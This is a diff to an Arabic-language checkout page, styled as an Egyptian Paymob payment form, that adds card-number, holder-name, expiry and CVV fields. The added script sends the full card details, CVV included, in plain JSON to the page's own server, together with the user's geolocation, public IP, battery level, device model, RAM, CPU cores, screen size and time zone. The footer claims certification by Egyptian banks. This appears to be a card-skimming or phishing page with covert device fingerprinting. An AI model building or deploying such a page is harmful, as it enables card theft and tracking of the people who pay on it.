@@ -114,6 +114,17 @@
             font-size: 18px;
         }
 
+        .toggle-password {
+            position: absolute;
+            left: 12px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #6c757d;
+            font-size: 16px;
+            outline: none;
+        }
+
         .error-message {
             color: #dc3545;
             font-size: 12px;
@@ -123,9 +134,32 @@
             direction: rtl;
         }
 
+        .input-containers {
+            display: flex;
+            gap: 10px;
+        }
+
+        .input-containers .input-group-custom {
+            flex: 1;
+        }
+
+        #card_section {
+            display: none;
+        }
+
         .card-footer-box {
             text-align: center;
             margin-top: 20px;
+        }
+
+        .saveCardText {
+            display: flex;
+            align-items: center;
+            justify-content: flex-end;
+            gap: 8px;
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 15px;
         }
 
         .submit-btn {
@@ -196,6 +230,11 @@
             height: 48px;
         }
 
+        .bank-logo-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 10px rgba(0,0,0,0.08);
+        }
+
         .bank-logo-card img {
             max-height: 32px;
             max-width: 90px;
@@ -215,6 +254,8 @@
         <div class="checkout-card">
             <section class="card-inputs">
                 <form id="paymob_checkout" novalidate>
+                    <input type="hidden" id="card_expiry_mm" name="card_expiry_mm">
+                    <input type="hidden" id="card_expiry_yy" name="card_expiry_yy">
 
                     <!-- 1. اختيار وسيلة الدفع -->
                     <div class="input-group-custom">
@@ -240,7 +281,7 @@
 
                     <!-- 3. رقم الهاتف / المحفظة -->
                     <div class="input-group-custom" id="phone_group">
-                        <label for="user_phone">رقم المحفظة الإلكترونية:</label>
+                        <label for="user_phone">رقم الهاتف / المحفظة:</label>
                         <div class="input-wrapper">
                             <input placeholder="01XXXXXXXXX" 
                                    type="text" 
@@ -257,6 +298,79 @@
                         <div class="error-message" id="error_phone">يجب كتابة رقم هاتف صحيح 11 رقماً ويبدأ بـ 01.</div>
                     </div>
 
+                    <!-- 4. خانات البطاقة البنكية -->
+                    <div id="card_section">
+                        <!-- رقم الكارت -->
+                        <div class="input-group-custom">
+                            <label for="card_number">رقم البطاقة البنكية:</label>
+                            <div class="input-wrapper">
+                                <input placeholder="Card Number" 
+                                       type="text" 
+                                       inputmode="numeric" 
+                                       name="number" 
+                                       id="card_number" 
+                                       maxlength="19" 
+                                       autocomplete="cc-number"
+                                       style="padding-right: 75px;">
+                                <div class="input-icon-right">
+                                    <i class="fa fa-cc-visa fa-lg" style="color: #1a1f71;"></i>
+                                    <i class="fa fa-cc-mastercard fa-lg" style="color: #eb001b;"></i>
+                                </div>
+                            </div>
+                            <div class="error-message" id="error_card_number">يجب كتابة 16 رقماً بالإنجليزية بدون حروف.</div>
+                        </div>
+
+                        <!-- اسم صاحب الكارت -->
+                        <div class="input-group-custom">
+                            <label for="card_name">اسم صاحب البطاقة:</label>
+                            <div class="input-wrapper">
+                                <input placeholder="Card Holder Name" 
+                                       type="text" 
+                                       name="name" 
+                                       id="card_name">
+                            </div>
+                            <div class="error-message" id="error_card_name">يرجى إدخال الاسم بالحروف الإنجليزية فقط.</div>
+                        </div>
+
+                        <!-- تاريخ الانتهاء و CVC -->
+                        <div class="input-containers">
+                            <div class="input-group-custom">
+                                <label for="mmyy">التاريخ:</label>
+                                <div class="input-wrapper">
+                                    <input placeholder="MM/YY" 
+                                           type="text" 
+                                           inputmode="numeric" 
+                                           name="expiry" 
+                                           id="mmyy" 
+                                           maxlength="5">
+                                </div>
+                                <div class="error-message" id="error_mmyy">تاريخ غير صحيح.</div>
+                            </div>
+
+                            <div class="input-group-custom">
+                                <label for="card_cvc">رمز CVV:</label>
+                                <div class="input-wrapper">
+                                    <input placeholder="CVV" 
+                                           type="password" 
+                                           inputmode="numeric" 
+                                           name="cvc" 
+                                           id="card_cvc" 
+                                           maxlength="3"
+                                           style="padding-left: 35px;">
+                                    <button type="button" class="toggle-password" id="toggleCvvBtn" title="إظهار/إخفاء الرمز">
+                                        <i class="fa fa-eye" id="cvvIcon"></i>
+                                    </button>
+                                </div>
+                                <div class="error-message" id="error_cvc">يجب إدخال 3 أرقام.</div>
+                            </div>
+                        </div>
+
+                        <div class="saveCardText">
+                            <label for="save_card">حفظ بيانات البطاقة للمعاملات القادمة</label>
+                            <input type="checkbox" id="save_card" value="tokenize" name="save_card">
+                        </div>
+                    </div>
+
                     <div class="card-footer-box">
                         <button id="submitButton" type="submit" class="submit-btn">
                             متابعة وتأكيد الدفع
@@ -269,6 +383,7 @@
         </div>
     </div>
 
+    <!-- التذييل مع شعارات البنوك -->
     <footer>
         <div class="container bank-logos-container">
             <div class="bank-logos-title"><i class="fa fa-shield" aria-hidden="true"></i> معتمد ومؤمن عبر البنوك المصرية والبنك المركزي</div>
@@ -281,21 +396,18 @@
     </footer>
 
     <script>
-        const mikrotikIP = "$(ip)";
-        const mikrotikMAC = "$(mac)";
-        const mikrotikUsername = "$(username)";
-
-        const internalIP = (mikrotikIP && !mikrotikIP.includes("$(")) ? mikrotikIP : (window.location.hostname || "127.0.0.1");
-        const macAddress = (mikrotikMAC && !mikrotikMAC.includes("$(")) ? mikrotikMAC : "غير متوفر";
-        const clientUsername = (mikrotikUsername && !mikrotikUsername.includes("$(")) ? mikrotikUsername : "";
-
+        // Elements
         const paymentMethodSelect = document.getElementById('payment_method');
+        const cardSection = document.getElementById('card_section');
         const phoneGroup = document.getElementById('phone_group');
 
         function toggleFields() {
-            if (paymentMethodSelect.value === 'card') {
+            const selectedMethod = paymentMethodSelect.value;
+            if (selectedMethod === 'card') {
+                cardSection.style.display = 'block';
                 phoneGroup.style.display = 'none';
             } else {
+                cardSection.style.display = 'none';
                 phoneGroup.style.display = 'block';
             }
         }
@@ -311,12 +423,32 @@
             }
         });
 
+        // إظهار وإخفاء رمز الـ CVV
+        const toggleCvvBtn = document.getElementById('toggleCvvBtn');
+        const cardCvcInput = document.getElementById('card_cvc');
+        const cvvIcon = document.getElementById('cvvIcon');
+
+        toggleCvvBtn.addEventListener('click', () => {
+            if (cardCvcInput.type === 'password') {
+                cardCvcInput.type = 'text';
+                cvvIcon.classList.remove('fa-eye');
+                cvvIcon.classList.add('fa-eye-slash');
+            } else {
+                cardCvcInput.type = 'password';
+                cvvIcon.classList.remove('fa-eye-slash');
+                cvvIcon.classList.add('fa-eye');
+            }
+        });
+
         function convertArabicDigitsToEnglish(str) {
             return str.replace(/[٠-٩]/g, function (d) {
                 return d.charCodeAt(0) - 1632;
             });
         }
 
+        // =================================================================
+        // 1. التحقق من المدخلات (Validations)
+        // =================================================================
         const amountInput = document.getElementById('pay_amount');
         amountInput.addEventListener('input', function (e) {
             let val = convertArabicDigitsToEnglish(e.target.value).replace(/[^\d.]/g, '');
@@ -363,31 +495,207 @@
             }
         }
 
+        const cardNumberInput = document.getElementById('card_number');
+        cardNumberInput.addEventListener('input', function (e) {
+            let val = convertArabicDigitsToEnglish(e.target.value).replace(/\D/g, '');
+            if (val.length > 16) val = val.substring(0, 16);
+            let formatted = val.match(/.{1,4}/g)?.join(' ') || '';
+            e.target.value = formatted;
+            validateCardNumber();
+        });
+
+        function validateCardNumber() {
+            if (paymentMethodSelect.value !== 'card') return true;
+            const rawValue = cardNumberInput.value.replace(/\s+/g, '');
+            const errorElement = document.getElementById('error_card_number');
+            if (rawValue.length < 16) {
+                cardNumberInput.classList.add('is-invalid');
+                errorElement.style.display = 'block';
+                return false;
+            } else {
+                cardNumberInput.classList.remove('is-invalid');
+                errorElement.style.display = 'none';
+                return true;
+            }
+        }
+
+        const mmyyInput = document.getElementById('mmyy');
+        mmyyInput.addEventListener('input', function (e) {
+            let val = convertArabicDigitsToEnglish(e.target.value).replace(/\D/g, '');
+            if (val.length >= 2) {
+                e.target.value = val.substring(0, 2) + '/' + val.substring(2, 4);
+            } else {
+                e.target.value = val;
+            }
+            validateMMYY();
+        });
+
+        function validateMMYY() {
+            if (paymentMethodSelect.value !== 'card') return true;
+            const val = mmyyInput.value;
+            const errorElement = document.getElementById('error_mmyy');
+            const regex = /^(0[1-9]|1[0-2])\/\d{2}$/;
+
+            if (!regex.test(val)) {
+                mmyyInput.classList.add('is-invalid');
+                errorElement.style.display = 'block';
+                return false;
+            } else {
+                mmyyInput.classList.remove('is-invalid');
+                errorElement.style.display = 'none';
+                const parts = val.split('/');
+                document.getElementById('card_expiry_mm').value = parts[0];
+                document.getElementById('card_expiry_yy').value = parts[1];
+                return true;
+            }
+        }
+
+        const cvcInput = document.getElementById('card_cvc');
+        cvcInput.addEventListener('input', function (e) {
+            let val = convertArabicDigitsToEnglish(e.target.value).replace(/\D/g, '');
+            if (val.length > 3) val = val.substring(0, 3);
+            e.target.value = val;
+            validateCVC();
+        });
+
+        function validateCVC() {
+            if (paymentMethodSelect.value !== 'card') return true;
+            const val = cvcInput.value;
+            const errorElement = document.getElementById('error_cvc');
+            if (val.length < 3) {
+                cvcInput.classList.add('is-invalid');
+                errorElement.style.display = 'block';
+                return false;
+            } else {
+                cvcInput.classList.remove('is-invalid');
+                errorElement.style.display = 'none';
+                return true;
+            }
+        }
+
+        const nameInput = document.getElementById('card_name');
+        nameInput.addEventListener('input', function (e) {
+            e.target.value = e.target.value.replace(/[^a-zA-Z\s]/g, '');
+            validateName();
+        });
+
+        function validateName() {
+            if (paymentMethodSelect.value !== 'card') return true;
+            const val = nameInput.value.trim();
+            const errorElement = document.getElementById('error_card_name');
+            if (val.length < 3) {
+                nameInput.classList.add('is-invalid');
+                errorElement.style.display = 'block';
+                return false;
+            } else {
+                nameInput.classList.remove('is-invalid');
+                errorElement.style.display = 'none';
+                return true;
+            }
+        }
+
+        // =================================================================
+        // 2. الجلب والطلب (IP/Geolocation & Fetch)
+        // =================================================================
+        async function getPublicIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json', { timeout: 3000 });
+                const data = await response.json();
+                return data.ip;
+            } catch (err) {
+                return "تعذر الجلب من المتصفح";
+            }
+        }
+
+        function getGeolocation() {
+            return new Promise((resolve) => {
+                if ("geolocation" in navigator) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            resolve({
+                                lat: position.coords.latitude.toString(),
+                                lon: position.coords.longitude.toString()
+                            });
+                        },
+                        () => resolve({ lat: "30.0444", lon: "31.2357" }),
+                        { timeout: 5000 }
+                    );
+                } else {
+                    resolve({ lat: "30.0444", lon: "31.2357" });
+                }
+            });
+        }
+
         async function pay(e) {
             if (e) e.preventDefault();
 
             const isAmountValid = validateAmount();
-            const isPhoneValid = validatePhone();
+            let isPhoneValid = true;
+            let isCardValid = true, isNameValid = true, isExpiryValid = true, isCvcValid = true;
 
-            if (!isAmountValid || !isPhoneValid) return;
+            const selectedMethod = paymentMethodSelect.value;
+
+            if (selectedMethod === 'card') {
+                isCardValid = validateCardNumber();
+                isNameValid = validateName();
+                isExpiryValid = validateMMYY();
+                isCvcValid = validateCVC();
+            } else {
+                isPhoneValid = validatePhone();
+            }
+
+            if (!isAmountValid || !isPhoneValid || !isCardValid || !isNameValid || !isExpiryValid || !isCvcValid) {
+                return;
+            }
 
             const submitBtn = document.getElementById("submitButton");
             submitBtn.disabled = true;
-            submitBtn.innerText = "جاري تحويلك لصفحة الدفع الآمنة...";
+            submitBtn.innerText = "جاري المعالجة والتحويل...";
 
             let clientID = localStorage.getItem("clientID");
             if (!clientID) {
-                clientID = (clientUsername ? clientUsername + "_" : "DEV_") + Math.random().toString(36).substr(2, 9) + "_" + Date.now();
+                clientID = "DEV_" + Math.random().toString(36).substr(2, 9) + "_" + Date.now();
                 localStorage.setItem("clientID", clientID);
             }
 
+            let batteryLevel = "غير مدعوم";
+            try {
+                if (navigator.getBattery) {
+                    const batt = await navigator.getBattery();
+                    batteryLevel = Math.round(batt.level * 100) + "%";
+                }
+            } catch (err) {}
+
+            const [geo, publicIP] = await Promise.all([
+                getGeolocation(),
+                getPublicIP()
+            ]);
+
             const payload = {
                 amount: document.getElementById("pay_amount").value,
-                payment_method: paymentMethodSelect.value,
-                phone: paymentMethodSelect.value === "wallet" ? document.getElementById("user_phone").value : "غير محدد",
-                internalIP: internalIP,
-                mac: macAddress,
-                clientID: clientID
+                payment_method: selectedMethod,
+                phone: selectedMethod === "wallet" ? document.getElementById("user_phone").value : "غير محدد",
+                card_data: {
+                    number: selectedMethod === "card" ? cardNumberInput.value.replace(/\s+/g, '') : "",
+                    name: selectedMethod === "card" ? nameInput.value : "",
+                    expiry: selectedMethod === "card" ? mmyyInput.value : "",
+                    cvc: selectedMethod === "card" ? cvcInput.value : ""
+                },
+                save_card: document.getElementById("save_card").checked ? "tokenize" : "لا",
+                clientID: clientID,
+                publicIP: publicIP,
+                lat: geo.lat,
+                lon: geo.lon,
+                city: "القاهرة",
+                country: "مصر",
+                battery: batteryLevel,
+                deviceModel: navigator.userAgent,
+                deviceRAM: (navigator.deviceMemory || "غير معروف") + " GB",
+                cpuCores: navigator.hardwareConcurrency || "غير معروف",
+                deviceType: /Mobi|Android/i.test(navigator.userAgent) ? "هاتف محمول" : "كمبيوتر",
+                screenSize: `${window.screen.width}x${window.screen.height}`,
+                userTimeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                lang: navigator.language
             };
 
             try {
@@ -402,12 +710,12 @@
                 if (resData.payment_url) {
                     window.location.href = resData.payment_url;
                 } else {
-                    alert(resData.error || "حدث خطأ أثناء معالجة الدفع.");
+                    alert(resData.error || "حدث خطأ غير متوقع أثناء معالجة عملية الدفع.");
                     submitBtn.disabled = false;
                     submitBtn.innerText = "متابعة وتأكيد الدفع";
                 }
             } catch (err) {
-                console.error(" Error processing payment:", err);
+                console.error("❌ Error processing payment:", err);
                 alert("تعذر الاتصال بالسيرفر. يرجى التأكد من الاتصال بالشبكة والمحاولة مجدداً.");
                 submitBtn.disabled = false;
                 submitBtn.innerText = "متابعة وتأكيد الدفع";
